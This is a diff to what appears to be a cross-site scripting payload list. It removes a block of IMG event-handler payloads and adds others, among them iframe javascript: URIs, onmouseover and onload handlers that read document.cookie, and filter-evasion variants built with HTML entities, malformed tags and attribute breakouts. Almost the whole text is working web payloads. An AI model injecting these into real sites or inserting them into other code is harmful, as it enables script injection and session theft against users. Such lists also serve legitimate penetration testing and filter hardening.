@@ -36,38 +36,35 @@ An attacker can use yyy to send a malicious script to an unsuspecting user. The 
 
 
 
-<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
-<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
+
+<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
+
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<INPUT TYPE="BUTTON" action="alert('yyy')"/>
+"><h23><IFRAME SRC="javascript:alert('yyy');"></IFRAME>">2323</h23>
+"><h23><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>2323</h23>
+<IFRAME SRC="javascript:alert('yyy');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+"><h23><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>2323</h23>
+"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
+"><h23><IFRAME width="420" height="3235" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>2323</h23>
+<IFRAME width="420" height="3235" frameborder="0" onload="alert(document.cookie)"></IFRAME>
+"><h23><IFRAME SRC="javascript:alert('yyy');"></IFRAME>">2323</h23>
+"><h23><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>2323</h23>
+<IFRAME SRC="javascript:alert('yyy');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<sVg><scRipt >alert&lpar;23&rpar; {Opera}
+
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+
+http://www.google<script .com>alert(document.location)</script
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+
 
 
 
